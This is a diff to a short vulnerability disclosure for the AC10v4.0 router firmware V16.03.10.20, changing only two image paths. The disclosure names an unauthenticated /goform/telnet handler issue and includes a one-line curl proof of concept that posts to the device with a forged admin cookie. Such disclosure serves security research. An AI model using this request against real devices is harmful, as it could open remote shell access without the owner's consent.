@@ -12,7 +12,7 @@ AC10v4.0 V16.03.10.20
 
 An issue was discovered in AC10v4.0 V16.03.10.20 devices. An HTTP request within the handler function of the /goform/telnet route. This could lead to Shell Metacharacters.
 
-![1736439948488](F:\Desktop\工具\二进制漏洞\IoT\img\1736439948488.png)
+![1736439948488](/img/1736439948488.png)
 
 ## POC
 
@@ -20,5 +20,5 @@ An issue was discovered in AC10v4.0 V16.03.10.20 devices. An HTTP request within
 curl -i -X POST http://192.168.1.100/goform/telnet -d aa=aa --cookie "user=admin" --http0.9
 ```
 
-![1736440027143](F:\Desktop\工具\二进制漏洞\IoT\img\1736440027143.png)
+![1736440027143](/img/1736440027143.png)
 
